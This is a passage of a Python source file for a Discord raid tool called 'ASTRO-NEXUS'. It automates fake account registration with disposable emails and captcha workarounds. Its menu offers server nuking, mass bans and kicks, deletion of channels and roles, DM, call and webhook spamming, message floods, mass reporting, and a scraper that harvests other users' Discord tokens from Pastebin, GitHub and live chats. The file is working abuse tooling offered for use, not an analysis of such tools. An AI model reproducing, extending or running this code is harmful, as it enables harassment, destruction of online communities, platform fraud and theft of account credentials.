                    "system_locale": "en-US",
                    "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "browser_version": "120.0.0.0",
                    "os_version": "10",
                    "referrer": "",
                    "referring_domain": "",
                    "referrer_current": "",
                    "referring_domain_current": "",
                    "release_channel": "stable",
                    "client_build_number": 429117,
                    "client_event_source": None
                }).encode()).decode()
            }
            
            console.log("REGISTERING", C["yellow"], username, email)
            res = self.session.post(
                "https://discord.com/api/v9/auth/register",
                headers=headers,
                json=payload
            )
            
            console.log("DEBUG", C["cyan"], "Response Status", str(res.status_code))
            
            if res.status_code == 201:
                data = res.json()
                token = data.get("token")
                console.log("SUCCESS", C["green"], username, "Account created!")
                return {"token": token, "email": email, "username": username, "password": password}
            elif res.status_code == 400:
                try:
                    error = res.json()
                    error_msg = error.get("message", "Unknown error")
                    
                    # Show detailed validation errors
                    if "errors" in error:
                        console.log("ERROR", C["red"], "Validation Errors", str(error["errors"]))
                        time.sleep(3)
                    
                    console.log("ERROR", C["red"], "Registration", error_msg)
                    time.sleep(2)
                except:
                    console.log("ERROR", C["red"], "Registration", f"Status 400 - {res.text[:200]}")
                    time.sleep(3)
                if "captcha" in str(error).lower():
                    console.log("CAPTCHA", C["yellow"], "Required", "Retrying with manual solve...")
                    return "captcha_required"
                return None
            else:
                console.log("ERROR", C["red"], "Registration", f"Status {res.status_code}")
                return None
                
        except Exception as e:
            console.log("ERROR", C["red"], "Registration", str(e))
            return None
    
    def verify_email(self, email, provider, token):
        """Auto-verify email using verification link"""
        try:
            console.log("WAITING", C["yellow"], "Verification Email", "Checking inbox...")
            
            # Wait for verification email (max 60 seconds)
            for attempt in range(12):
                time.sleep(5)
                messages = self.email_gen.monitor_inbox(email, provider)
                
                for msg in messages:
                    body = msg.get("body", "")
                    subject = msg.get("subject", "")
                    
                    if "verify" in subject.lower() or "discord" in subject.lower():
                        # Extract verification link
                        import re
                        link_match = re.search(r'https://discord\.com/verify[^\s<>"]+', body)
                        if link_match:
                            verify_link = link_match.group(0)
                            console.log("FOUND", C["green"], "Verification Link", verify_link[:50] + "...")
                            
                            # Click verification link
                            headers = {"Authorization": token}
                            verify_res = self.session.get(verify_link, headers=headers)
                            
                            if verify_res.status_code == 200:
                                console.log("VERIFIED", C["green"], email, "Email verified!")
                                return True
            
            console.log("TIMEOUT", C["red"], "Verification", "Email not received")
            return False
            
        except Exception as e:
            console.log("ERROR", C["red"], "Verification", str(e))
            return False
    
    def validate_token(self, token):
        """Validate Discord token"""
        try:
            headers = {"Authorization": token}
            res = self.session.get("https://discord.com/api/v9/users/@me", headers=headers)
            
            if res.status_code == 200:
                data = res.json()
                username = data.get("username")
                console.log("VALID", C["green"], "Token", f"{username} | {token[:30]}...")
                return True
            else:
                console.log("INVALID", C["red"], "Token", f"Status {res.status_code}")
                return False
                
        except Exception as e:
            console.log("ERROR", C["red"], "Validation", str(e))
            return False
    
    def create_account(self, email_provider="tempmail", captcha_solve=False):
        """Full account creation pipeline"""
        try:
            # Step 1: Generate email
            console.log("STEP 1", C["cyan"], "Generating Email", email_provider)
            try:
                if email_provider == "tempmail":
                    email_data = self.email_gen.generate_tempmail()
                elif email_provider == "guerrilla":
                    email_data = self.email_gen.generate_guerrilla()
                elif email_provider == "10minutemail":
                    email_data = self.email_gen.generate_10minutemail()
                else:
                    console.log("ERROR", C["red"], "Invalid Provider", email_provider)
                    time.sleep(2)  # Pause to read error
                    return None
            except Exception as e:
                console.log("ERROR", C["red"], "Email Generation Failed", str(e))
                time.sleep(3)  # Pause to read error
                return None
            
            if not email_data:
                console.log("ERROR", C["red"], "Email Generation", "Failed - No data returned")
                time.sleep(2)  # Pause to read error
                return None
            
            email = email_data["email"]
            provider = email_data["provider"]
            console.log("SUCCESS", C["green"], "Email Generated", email)
            
            # Step 2: Generate credentials
            console.log("STEP 2", C["cyan"], "Generating Credentials", "...")
            try:
                username = self.generate_username()
                password = self.generate_password()
                console.log("SUCCESS", C["green"], "Credentials", f"{username} | {password[:4]}****")
            except Exception as e:
                console.log("ERROR", C["red"], "Credential Generation Failed", str(e))
                time.sleep(3)  # Pause to read error
                return None
            
            # Step 3: Register account
            console.log("STEP 3", C["cyan"], "Registering Account", username)
            captcha_key = None
            if captcha_solve:
                captcha_key = self.solve_captcha_browser(email, username, password)
            
            try:
                result = self.register_account(email, username, password, captcha_key)
            except Exception as e:
                console.log("ERROR", C["red"], "Registration Exception", str(e))
                time.sleep(3)  # Pause to read error
                return None
            
            if result == "captcha_required":
                console.log("RETRY", C["yellow"], "Captcha Required", "Solving manually...")
                captcha_key = self.solve_captcha_browser(email, username, password)
                try:
                    result = self.register_account(email, username, password, captcha_key)
                except Exception as e:
                    console.log("ERROR", C["red"], "Registration Retry Failed", str(e))
                    time.sleep(3)  # Pause to read error
                    return None
            
            if not result or not result.get("token"):
                console.log("ERROR", C["red"], "Registration", "Failed - No token returned")
                time.sleep(2)  # Pause to read error
                return None
            
            token = result["token"]
            console.log("SUCCESS", C["green"], "Token Received", token[:30] + "...")
            
            # Step 4: Verify email (optional, may fail for temp emails)
            console.log("STEP 4", C["cyan"], "Verifying Email", "...")
            try:
                verified = self.verify_email(email, provider, token)
            except Exception as e:
                console.log("WARNING", C["yellow"], "Email Verification Failed", str(e))
                verified = False
            
            # Step 5: Validate token
            console.log("STEP 5", C["cyan"], "Validating Token", "...")
            try:
                valid = self.validate_token(token)
            except Exception as e:
                console.log("ERROR", C["red"], "Token Validation Failed", str(e))
                time.sleep(3)  # Pause to read error
                return None
            
            if valid:
                account_data = {
                    "email": email,
                    "username": username,
                    "password": password,
                    "token": token,
                    "verified": verified,
                    "created": time.time()
                }
                console.log("COMPLETE", C["green"], "Account Created", username)
                return account_data
            else:
                console.log("ERROR", C["red"], "Token Invalid", "Account may be flagged")
                return None
                
        except Exception as e:
            console.log("ERROR", C["red"], "Account Creation", str(e))
            return None

class Menu:
    def __init__(self):
        if not color:
            self.background = C["light_blue"]
        else:
            self.background = C[color]

        self.raider = Raider()
        self.options = {
            "1": self.joiner,
            "2": self.leaver,
            "3": self.spammer,
            "4": self.checker,
            "5": self.reactor,
            "6": self.nuker,
            "7": self.formatter,
            "8": self.button,
            "9": self.accept,
            "10": self.guild,
            "11": self.friender,
            "12": self.analytics,
            "13": self.onliner,
            "14": self.soundbord,
            "15": self.nick_changer,
            "16": self.Thread_Spammer,
            "17": self.typier,
            "18": self.sniper,
            "19": self.caller,
            "20": self.bio_changer,
            "21": self.voice_joiner,
            "22": self.onboard,
            "23": self.dm_spam,
            "24": self.exits,
            "25": self.mass_report,
            "26": self.hypesquad,
            "27": self.mass_block,
            "28": self.leave_all,
            "29": self.token_gen,
            "30": self.nuke_all,
            "31": self.del_channels,
            "32": self.del_roles,
            "33": self.del_emojis,
            "34": self.del_webhooks,
            "35": self.create_chans,
            "36": self.create_rols,
            "37": self.m_ban,
            "38": self.m_kick,
            "39": self.identity,
            "40": self.m_prune,
            "41": self.auto_stat,
            "42": self.grant_adm,
            "43": self.audit_flooder,
            "44": self.webhook_overdrive,
            "45": self.proxy_gen,
            "46": self.proxy_clean,
            "47": self.friend_dm,
            "48": self.friend_clear,
            "49": self.server_clone,
            "50": self.rainbow_cyclone,
            "51": self.sticker_bomb,
            "52": self.email_gen,
            "53": self.discord_gen,
            "~": self.credit,
            "?": self.tokens_tutorial,
            "!": self.proxies_tutorial,
            "h": self.usage_guide,
        }

    # --- DISCORD MANAGEMENT WRAPPERS ---

    def proxy_gen(self):
        console.title("ASTRO-NEXUS - Proxy Overdrive")
        self.raider.proxy_overdrive()
        input(f"\n{console.prompt('Strike Complete. Press Enter')}")

    def proxy_clean(self):
        console.title("ASTRO-NEXUS - Proxy Sanitization")
        self.raider.proxy_cleaner()
        input(f"\n{console.prompt('Purge Complete. Press Enter')}")

    def friend_dm(self):
        console.title("ASTRO-NEXUS - Friend DM Strike")
        msg = input(f"\n   {self.background}» Message «{Fore.RESET} ")
        self.raider.friend_dm(msg)
        input(f"\n{console.prompt('Strike Deployed. Press Enter')}")

    def friend_clear(self):
        console.title("ASTRO-NEXUS - Friend Purge")
        self.raider.friend_clear()
        input(f"\n{console.prompt('Purge Complete. Press Enter')}")

    def server_clone(self):
        console.title("ASTRO-NEXUS - Empire Cloner")
        src = input(f"\n   {self.background}» Source Guild ID «{Fore.RESET} ")
        dest = input(f"   {self.background}» Target Guild ID «{Fore.RESET} ")
        self.raider.server_clone(src, dest)
        input(f"\n{console.prompt('Cloning Complete. Press Enter')}")

    def rainbow_cyclone(self):
        console.title("ASTRO-NEXUS - Rainbow Cyclone")
        g_id = self.guild_id_prompt()
        self.raider.rainbow_cyclone(g_id)
        input(f"\n{console.prompt('Cyclone Stopped. Press Enter')}")

    def sticker_bomb(self):
        console.title("ASTRO-NEXUS - Sticker Assault")
        c_id = input(f"\n   {self.background}» Channel ID «{Fore.RESET} ")
        s_id = input(f"   {self.background}» Sticker ID «{Fore.RESET} ")
        self.raider.sticker_bomb(c_id, s_id)
        input(f"\n{console.prompt('Assault Deployed. Press Enter')}")

    def guild_id_prompt(self):
        console.clear()
        console.render_ascii()
        return input(f"{console.prompt('Guild ID')}")

    def nuke_all(self):
        g_id = self.guild_id_prompt()
        self.raider.server_nuker(g_id)
        input(f"\n{console.prompt('Press Enter')}")
        input(f"\n{console.prompt('Granting... Press Enter')}")

    def del_channels(self):
        g_id = self.guild_id_prompt()
        self.raider.delete_all_channels(g_id)
        input(f"\n{console.prompt('Done. Press Enter')}")
        input(f"\n{console.prompt('Granting... Press Enter')}")

    def del_roles(self):
        g_id = self.guild_id_prompt()
        self.raider.delete_all_roles(g_id)
        input(f"\n{console.prompt('Done. Press Enter')}")
        input(f"\n{console.prompt('Granting... Press Enter')}")

    def del_emojis(self):
        g_id = self.guild_id_prompt()
        self.raider.delete_all_emojis(g_id)
        input(f"\n{console.prompt('Done. Press Enter')}")
        input(f"\n{console.prompt('Granting... Press Enter')}")

    def del_webhooks(self):
        g_id = self.guild_id_prompt()
        self.raider.delete_all_webhooks(g_id)
        input(f"\n{console.prompt('Done. Press Enter')}")
        input(f"\n{console.prompt('Granting... Press Enter')}")

    def create_chans(self):
        g_id = self.guild_id_prompt()
        name = input(f"{console.prompt('Channel Name')}")
        self.raider.mass_create_channels(g_id, name)
        input(f"\n{console.prompt('Done. Press Enter')}")
        input(f"\n{console.prompt('Granting... Press Enter')}")

    def create_rols(self):
        g_id = self.guild_id_prompt()
        name = input(f"{console.prompt('Role Name')}")
        self.raider.mass_create_roles(g_id, name)
        input(f"\n{console.prompt('Done. Press Enter')}")
        input(f"\n{console.prompt('Granting... Press Enter')}")

    def m_ban(self):
        g_id = self.guild_id_prompt()
        self.raider.mass_ban(g_id)
        input(f"\n{console.prompt('Banning... Press Enter')}")
        input(f"\n{console.prompt('Granting... Press Enter')}")

    def m_kick(self):
        g_id = self.guild_id_prompt()
        self.raider.mass_kick(g_id)
        input(f"\n{console.prompt('Kicking... Press Enter')}")
        input(f"\n{console.prompt('Granting... Press Enter')}")

    def identity(self):
        g_id = self.guild_id_prompt()
        name = input(f"{console.prompt('New Server Name')}")
        icon = input(f"{console.prompt('Icon URL (Enter for None)')}")
        self.raider.change_guild_identity(g_id, name, icon if icon else None)
        input(f"\n{console.prompt('Done. Press Enter')}")
        input(f"\n{console.prompt('Granting... Press Enter')}")

    def m_prune(self):
        g_id = self.guild_id_prompt()
        days = input(f"{console.prompt('Days (Default 7)')}")
        self.raider.prune_members(g_id, int(days) if days else 7)
        input(f"\n{console.prompt('Pruning... Press Enter')}")
        input(f"\n{console.prompt('Granting... Press Enter')}")

    def auto_stat(self):
        text = input(f"{console.prompt('Status Text')}")
        self.raider.auto_status(text)
        input(f"\n{console.prompt('Done. Press Enter')}")
        input(f"\n{console.prompt('Granting... Press Enter')}")

    def grant_adm(self):
        g_id = self.guild_id_prompt()
        self.raider.grant_admin_to_all(g_id)
        input(f"\n{console.prompt('Granting... Press Enter')}")
        self.main_menu()

    def main_menu(self):
        while True:
            try:
                console.run()
                choice = input(f"{' '*6}{self.background}-> {Fore.RESET}")

                if choice.startswith('0') and len(choice) == 2:
                    choice = str(int(choice))

                if choice.lower() in self.options:
                    self.options[choice.lower()]()
                else:
                    pass
            except KeyboardInterrupt:
                console.log("SYSTEM", C["yellow"], "KeyboardInterrupt. Resetting Interface...")
                STRIKE_EVENT.clear()
                time.sleep(1)
            except Exception as e:
                console.log("INTERFACE ERROR", C["red"], str(e))
                time.sleep(2)

    def rainbow_pulse(self):
        colors = [C["red"], C["orange"], C["yellow"], C["green"], C["blue"], C["magenta"], C["orchid"], C["aqua"]]
        try:
            t_size = os.get_terminal_size().columns
        except:
            t_size = 120
        msg = "⋘ ACCESSING ASTRO-NEXUS OVERDRIVE ⋙"
        padding = (t_size - len(msg)) // 2
        for _ in range(5): # Faster, more intense pulse
            for color in colors:
                sys.stdout.write(f"\r{' ' * padding}{color}{msg}{Fore.RESET}")
                sys.stdout.flush()
                time.sleep(0.02)
        print("\n")

    def run(self, func, args):
        STRIKE_EVENT.clear()
        self.rainbow_pulse()
        console.clear()
        console.render_ascii()

        console.log("EXECUTION", C["rose"], "ORCHESTRATING STRIKE", f"Threads: {len(args)}")
        console.log("SYSTEM", C["gray"], "Press CTRL+C to Abort Strike")

        try:
            with ThreadPoolExecutor(max_workers=100) as executor:
                # Use a mapping to track futures and handle interrupts more gracefully
                futures = {executor.submit(func, *arg): arg for arg in args}
                
                # Check for strike event or interrupt every few milliseconds
                while any(not f.done() for f in futures):
                    if STRIKE_EVENT.is_set():
                        executor.shutdown(wait=False, cancel_futures=True)
                        break
                    time.sleep(0.05)
        except KeyboardInterrupt:
            STRIKE_EVENT.set()
            console.log("HALTED", C["yellow"], "STRIKE ABORTED BY USER")
            # Wait a moment for workers to see the event, but don't hang
            time.sleep(0.5)
        finally:
            # Ensure event is cleared for next run
            STRIKE_EVENT.clear()

        try:
            input(f"\n   {self.background}» Operation Finished. Press Enter «{Fore.RESET}")
        except: pass

    def token_gen(self):
        console.clear()
        console.render_ascii()
        console.log("VACUUM", C["aqua"], "1: Deep Web Crawler (Pastebin/GitHub/Gist)")
        console.log("VACUUM", C["aqua"], "2: Channel Sniper (Sniff current server chats)")
        mode = input(f"\n   {self.background}» Mode «{Fore.RESET} ")

        console.log("INFO", C["gray"], "Recommended: 9-12 threads (3 workers per site)")
        threads = input(f"{console.prompt('Threads (Suction Power)')}")
        try:
            t_count = int(threads)
        except:
            t_count = 10

        console.log("SYSTEM", C["gray"], f"Activating The Vacuum v2 with {t_count} threads...")
        args = [(mode,) for _ in range(t_count)]
        self.run(self.raider.token_scraper, args)
        # self.main_menu() # Removed as run() now handles it

    def audit_stat(self):
        guild = input(f"{console.prompt('Server ID')}")
        self.raider.audit_flooder(guild)

    def webhook_overdrive(self):
        guild = input(f"{console.prompt('Server ID')}")
        message = input(f"{console.prompt('Spam Message')}")
        self.raider.webhook_overdrive(guild, message)

    def m_prune(self):
        guild = input(f"{console.prompt('Server ID')}")
        self.raider.prune_members(guild)

    def audit_flooder(self):
        guild = input(f"{console.prompt('Server ID')}")
        self.raider.audit_flooder(guild)

    @wrapper
    def dm_spam(self):
        console.title(f"ASTRO-NEXUS - Dm Spammer")
        user_id = input(console.prompt("User ID"))
        if user_id == "":
            self.main_menu()

        message = input(console.prompt("Message"))
        if message == "":
            self.main_menu()

        console.clear()
        console.render_ascii()
        args = [
            (token, user_id, message) for token in tokens
        ]
        self.run(self.raider.dm_spammer, args)
        # self.main_menu() # Removed as run() now handles it

    @wrapper
    def soundbord(self):
        console.title(f"ASTRO-NEXUS - Soundboard Spam")
        Link = input(console.prompt("Channel LINK"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()

        try:
            parts = Link.split("/")
            if len(parts) < 6:
                console.log("ERROR", C["red"], "Invalid Link", "Format: https://discord.com/channels/GUILD/CHANNEL")
                input(f"\n{console.prompt('Press Enter')}")
                self.main_menu()
            channel = parts[6] if len(parts) > 6 else parts[5]
            guild = parts[5] if len(parts) > 6 else parts[4]
        except:
            console.log("ERROR", C["red"], "Invalid Link", "Could not parse channel/guild IDs")
            input(f"\n{console.prompt('Press Enter')}")
            self.main_menu()

        console.clear()
        console.render_ascii()
        for token in tokens:
            threading.Thread(target=self.raider.join_voice_channel, args=(token, guild, channel)).start()
            threading.Thread(target=self.raider.soundbord, args=(token, channel)).start()
        input(f"\n   {self.background}» Operation Finished. Press Enter «{Fore.RESET}") # Added to pause before returning
        self.main_menu() # Kept as it's not using self.run()

    @wrapper
    def friender(self):
        console.title(f"ASTRO-NEXUS - Friender")
        nickname = input(console.prompt("Nick"))
        if nickname == "":
            self.main_menu()

        args = [
            (token, nickname) for token in tokens
        ]
        self.run(self.raider.friender, args)
        # self.main_menu() # Removed as run() now handles it

    @wrapper
    def caller(self):
        console.title(f"ASTRO-NEXUS - Call Spammer")
        user_id = input(console.prompt("User ID"))
        if user_id == "":
            self.main_menu()

        console.clear()
        console.render_ascii()
        args = [
            (token, user_id) for token in tokens
        ]
        self.run(self.raider.call_spammer, args)
        # self.main_menu() # Removed as run() now handles it

    def onliner(self):
        console.title(f"ASTRO-NEXUS - Onliner")
        args = [
            (token, websocket.WebSocket()) for token in tokens
        ]
        self.run(self.raider.onliner, args)
        # self.main_menu() # Removed as run() now handles it

    @wrapper
    def typier(self):
        console.title(f"ASTRO-NEXUS - Typer")
        Link = input(console.prompt(f"Channel LINK"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()

        try:
            parts = Link.split("/")
            if len(parts) < 6:
                console.log("ERROR", C["red"], "Invalid Link", "Format: https://discord.com/channels/GUILD/CHANNEL")
                input(f"\n{console.prompt('Press Enter')}")
                self.main_menu()
            channelid = parts[6] if len(parts) > 6 else parts[5]
        except:
            console.log("ERROR", C["red"], "Invalid Link", "Could not parse channel ID")
            input(f"\n{console.prompt('Press Enter')}")
            self.main_menu()
        args = [
            (token, channelid) for token in tokens
        ]
        self.run(self.raider.typier, args)
        # self.main_menu() # Removed as run() now handles it

    @wrapper
    def nick_changer(self):
        console.title(f"ASTRO-NEXUS - Nickname Changer")
        nick = input(console.prompt("Nick"))
        if nick == "" or len(nick) > 32:
            self.main_menu()

        guild = input(console.prompt("Guild ID"))
        if guild == "":
            self.main_menu()

        args = [
            (token, guild, nick) for token in tokens
        ]
        self.run(self.raider.mass_nick, args)
        # self.main_menu() # Removed as run() now handles it

    @wrapper
    def voice_joiner(self):
        console.title(f"ASTRO-NEXUS - Voice Joiner")
        Link = input(console.prompt("Channel LINK"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()

        try:
            parts = Link.split("/")
            if len(parts) < 6:
                console.log("ERROR", C["red"], "Invalid Link", "Format: https://discord.com/channels/GUILD/CHANNEL")
                input(f"\n{console.prompt('Press Enter')}")
                self.main_menu()
            guild = parts[5] if len(parts) > 6 else parts[4]
            channel = parts[6] if len(parts) > 6 else parts[5]
        except:
            console.log("ERROR", C["red"], "Invalid Link", "Could not parse channel/guild IDs")
            input(f"\n{console.prompt('Press Enter')}")
            self.main_menu()
        args = [
            (token, guild, channel) for token in tokens
        ]
        self.run(self.raider.join_voice_channel, args)
        # self.main_menu() # Removed as run() now handles it

    @wrapper
    def Thread_Spammer(self):
        console.title(f"ASTRO-NEXUS - Thread Spammer")
        Link = input(console.prompt("Channel LINK"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()

        name = input(console.prompt("Name"))
        if name == "":
            return

        try:
            parts = Link.split("/")
            if len(parts) < 6:
                console.log("ERROR", C["red"], "Invalid Link", "Format: https://discord.com/channels/GUILD/CHANNEL")
                input(f"\n{console.prompt('Press Enter')}")
                return
            channel_id = parts[6] if len(parts) > 6 else parts[5]
        except:
            console.log("ERROR", C["red"], "Invalid Link", "Could not parse channel ID")
            input(f"\n{console.prompt('Press Enter')}")
            return
        args = [
            (token, channel_id, name) for token in tokens
        ]
        self.run(self.raider.thread_spammer, args)
        # self.main_menu() # Removed as run() now handles it

    @wrapper
    def nuker(self):
        console.title(f"ASTRO-NEXUS - Server Nuker")
        guild_id = input(console.prompt("Guild ID"))
        if guild_id == "":
            return

        console.clear()
        console.render_ascii()
        self.raider.server_nuker(guild_id)
        input(f"\n   {self.background}» Operation Finished. Press Enter «{Fore.RESET}") 

    @wrapper
    def analytics(self):
        console.title(f"ASTRO-NEXUS - Token Analytics")
        args = [
            (token,) for token in tokens
        ]
        self.run(self.raider.token_analytics, args)
        # self.main_menu() # Removed as run() now handles it

    @wrapper
    def sniper(self):
        console.title(f"ASTRO-NEXUS - Nitro Sniper")
        args = [
            (token,) for token in tokens
        ]
        self.run(self.raider.nitro_sniper, args)
        # self.main_menu() # Removed as run() now handles it

    @wrapper
    def joiner(self):
        console.title(f"ASTRO-NEXUS - Joiner")
        invite = input(console.prompt(f"Invite"))
        if invite == "":
            return

        invite = re.sub(r"(https?://)?(www\.)?(discord\.(gg|com)/(invite/)?|\.gg/)", "", invite).split("/")[0]

        self.raider.joiner(invite)
        input(f"\n   {self.background}» Operation Finished. Press Enter «{Fore.RESET}") 

    @wrapper
    def leaver(self):
        console.title(f"ASTRO-NEXUS - Leaver")
        guild = input(console.prompt("Guild ID"))
        if guild == "":
            self.main_menu()

        args = [
            (token, guild) for token in tokens
        ]
        self.run(self.raider.leaver, args)
        # self.main_menu() # Removed as run() now handles it

    @wrapper
    def spammer(self):
        console.title(f"ASTRO-NEXUS - Spammer [PILOT EDITION]")
        console.log("MODE", C["aqua"], "1: Global Strike (All Tokens)")
        console.log("MODE", C["aqua"], "2: Pilot Identity (Select Specific Account)")
        choice = input(f"\n   {self.background}» Option «{Fore.RESET} ")

        target_tokens = tokens
        if choice == "2":
            console.log("SYSTEM", C["gray"], "Fetching identities from the grid...")
            identities = []
            for i, t in enumerate(tokens[:15]): # Limit to first 15 for speed
                tag = self.raider.get_token_info(t)
                identities.append((t, tag))
                print(f"      {C['aqua']}[{i+1}] {C['gray']}{tag} {C['rose']}({t[:15]}...)")

            p_choice = input(f"\n   {self.background}» Select Pilot «{Fore.RESET} ")
            try:
                idx = int(p_choice) - 1
                target_tokens = [identities[idx][0]]
                console.log("PILOT", C["aqua"], f"Identity Locked: {identities[idx][1]}")
            except:
                console.log("ERROR", C["red"], "Invalid Selection, defaulting to Global.")

        link = input(console.prompt(f"Channel LINK"))
        if link == "" or not link.startswith("https://"):
            return

        try:
            parts = link.split("/")
            if len(parts) < 6:
                console.log("ERROR", C["red"], "Invalid Link", "Format: https://discord.com/channels/GUILD/CHANNEL")
                input(f"\n{console.prompt('Press Enter')}")
                return
            guild_id = parts[5] if len(parts) > 6 else parts[4]
            channel_id = parts[6] if len(parts) > 6 else parts[5]
        except:
            console.log("ERROR", C["red"], "Invalid Link", "Could not parse channel/guild IDs")
            input(f"\n{console.prompt('Press Enter')}")
            return

        console.log("ACTION", C["rose"], "[S]pam Standard | [D]OS Flood | [B]ypass Ghost")
        act = input(f"\n   {self.background}» Action «{Fore.RESET} ").lower()

        massping = "n"
        random_str = "n"
        message = ""
        delay = None

        if act == "d":
            message = input(console.prompt("Flood Message"))
            threads = input(console.prompt("Intensity (Threads 1-20)"))
            try: t_count = int(threads)
            except: t_count = 5
            args = [(target_tokens[0], channel_id, message) for _ in range(t_count)]
            self.run(self.raider.dos_flooder, args)
            return

        massping = input(console.prompt("Massping", True))
        random_str = input(console.prompt("Random String", True))
        message = input(console.prompt("Message"))

        delay_input = input(console.prompt("Delay (seconds)"))
        if delay_input != "":
            delay = float(delay_input)

        ping_count = None
        if "y" in massping:
            console.log(f"Scraping users", self.background, False, "this may take a while...")
            self.raider.member_scrape(guild_id, channel_id)
            count_str = input(console.prompt("Pings Amount"))
            ping_count = int(count_str) if count_str != "" else 10

        args = [
            (token, channel_id, message, guild_id, "y" in massping, ping_count, "y" in random_str, delay)
            for token in target_tokens
        ]

        self.run(self.raider.spammer, args)
        # self.main_menu() # Removed as run() now handles it

    def checker(self):
        console.title(f"ASTRO-NEXUS - Checker")
        self.raider.token_checker()

    @wrapper
    def reactor(self):
        console.title(f"ASTRO-NEXUS - Reactor")
        Link = input(console.prompt("Message Link"))
        if Link == "" or not Link.startswith("https://"):
            return

        channel_id = Link.split("/")[5]
        message_id = Link.split("/")[6]
        console.clear()
        console.render_ascii()
        self.raider.reactor_main(channel_id, message_id)
        # self.main_menu() # Removed as run() now handles it

    def button(self):
        console.title(f"ASTRO-NEXUS - Button Click")
        Link = input(console.prompt("Message Link"))
        if Link == "" or not Link.startswith("https://"):
            return

        guild_id = Link.split("/")[4]
        channel_id = Link.split("/")[5]
        message_id = Link.split("/")[6]

        console.clear()
        console.render_ascii()
        self.raider.button_bypass(channel_id, message_id, guild_id)
        # self.main_menu() # Removed as run() now handles it

    def formatter(self):
        console.title(f"ASTRO-NEXUS - Formatter")
        self.run(self.raider.format_tokens, [()])
        # self.main_menu() # Removed as run() now handles it

    @wrapper
    def email_gen(self):
        """Option 52: Email Generator"""
        console.title(f"ASTRO-NEXUS - Email Generator")
        console.clear()
        console.render_ascii()
        
        console.log("PROVIDERS", C["cyan"], "[1] TempMail | [2] 10MinuteMail | [3] Guerrilla | [4] Gmail Alias | [5] Generate All")
        choice = input(f"\n   {self.background}» Provider «{Fore.RESET} ").strip()
        
        email_gen = EmailGenerator()
        generated = []
        
        if choice == "1":
            result = email_gen.generate_tempmail()
            if result: generated.append(result)
        elif choice == "2":
            result = email_gen.generate_10minutemail()
            if result: generated.append(result)
        elif choice == "3":
            result = email_gen.generate_guerrilla()
            if result: generated.append(result)
        elif choice == "4":
            base = input(console.prompt("Base Gmail"))
            result = email_gen.generate_gmail_alias(base)
            if result: generated.append(result)
        elif choice == "5":
            console.log("GENERATING", C["yellow"], "All Providers", "This may take a moment...")
            for provider in [email_gen.generate_tempmail, email_gen.generate_10minutemail, email_gen.generate_guerrilla]:
                result = provider()
                if result: generated.append(result)
                time.sleep(0.5)
        
        if generated:
            console.log("SUCCESS", C["green"], f"Generated {len(generated)} emails")
            
            # Ask for inbox monitoring
            monitor = input(console.prompt("Monitor Inbox", True))
            if "y" in monitor.lower():
                console.log("MONITORING", C["cyan"], "Checking inboxes every 5 seconds... (Ctrl+C to stop)")
                try:
                    while True:
                        for email_data in generated:
                            email = email_data["email"]
                            provider = email_data["provider"]
                            messages = email_gen.monitor_inbox(email, provider)
                            if messages:
                                console.log("NEW MAIL", C["green"], email, f"{len(messages)} message(s)")
                        time.sleep(5)
                except KeyboardInterrupt:
                    console.log("STOPPED", C["yellow"], "Monitoring stopped")
            
            # Export emails
            email_gen.export_emails()
        
        input(f"\n   {self.background}» Press Enter to continue «{Fore.RESET}")
        self.main_menu()

    @wrapper
    def discord_gen(self):
        """Option 53: Discord Account Generator"""
        console.title(f"ASTRO-NEXUS - Discord Account Generator")
        console.clear()
        console.render_ascii()
        
        console.log("EMAIL PROVIDER", C["cyan"], "[1] TempMail | [2] Guerrilla | [3] 10MinuteMail")
        provider_choice = input(f"\n   {self.background}» Provider «{Fore.RESET} ").strip()
        
        provider_map = {"1": "tempmail", "2": "guerrilla", "3": "10minutemail"}
        provider = provider_map.get(provider_choice, "tempmail")
        
        console.log("CAPTCHA", C["yellow"], "Manual solving may be required")
        solve_captcha = input(console.prompt("Pre-solve captcha", True))
        
        account_gen = DiscordAccountGen()
        
        console.log("STARTING", C["cyan"], "Account Generation", "This may take 1-2 minutes...")
        account = account_gen.create_account(provider, "y" in solve_captcha.lower())
        
        if account:
            console.log("SUCCESS", C["green"], "Account Created!", "")
            console.log("EMAIL", C["cyan"], account["email"])
            console.log("USERNAME", C["cyan"], account["username"])
            console.log("PASSWORD", C["cyan"], account["password"])
            console.log("TOKEN", C["green"], account["token"][:50] + "...")
            console.log("VERIFIED", C["yellow" if not account["verified"] else "green"], str(account["verified"]))
            
            # Save to tokens.txt
            save = input(console.prompt("Save to tokens.txt", True))
            if "y" in save.lower():
                with open("data/tokens.txt", "a") as f:
                    f.write(f"{account['token']}\n")
                console.log("SAVED", C["green"], "Token added to tokens.txt")
            
            # Save full account data
            try:
                import json
                accounts_file = "data/generated_accounts.json"
                try:
                    with open(accounts_file, "r") as f:
                        accounts = json.load(f)
                except:
                    accounts = []
                
                accounts.append(account)
                with open(accounts_file, "w") as f:
                    json.dump(accounts, f, indent=2)
                console.log("SAVED", C["green"], f"Full data → {accounts_file}")
            except Exception as e:
                console.log("ERROR", C["red"], "Save Failed", str(e))
        
        input(f"\n   {self.background}» Press Enter to continue «{Fore.RESET}")
        self.main_menu()

    @wrapper
    def account_farm(self):
        """Option 54: Hybrid Account Farm (BEAST MODE)"""
        console.title(f"ASTRO-NEXUS - Account Farm")
        console.clear()
        console.render_ascii()
        
        console.log("BEAST MODE", C["rose"], "Batch Discord Account Generation", "")
        
        # Get batch size
        count_input = input(console.prompt("Batch Size (1-100)"))
        try:
            count = int(count_input)
            if count < 1 or count > 100:
                console.log("ERROR", C["red"], "Invalid count", "Must be 1-100")
                self.main_menu()
                return
        except:
            console.log("ERROR", C["red"], "Invalid input", "Must be a number")
            self.main_menu()
            return
        
        # Get provider
        console.log("EMAIL PROVIDER", C["cyan"], "[1] TempMail | [2] Guerrilla | [3] 10MinuteMail")
        provider_choice = input(f"\n   {self.background}» Provider «{Fore.RESET} ").strip()
        provider_map = {"1": "tempmail", "2": "guerrilla", "3": "10minutemail"}
        provider = provider_map.get(provider_choice, "tempmail")
        
        # Get threads
        threads_input = input(console.prompt("Threads (1-10)"))
        try:
            threads = int(threads_input)
            if threads < 1 or threads > 10:
                threads = 5
        except:
            threads = 5
        
        console.log("STARTING", C["cyan"], f"Generating {count} accounts", f"{threads} threads")
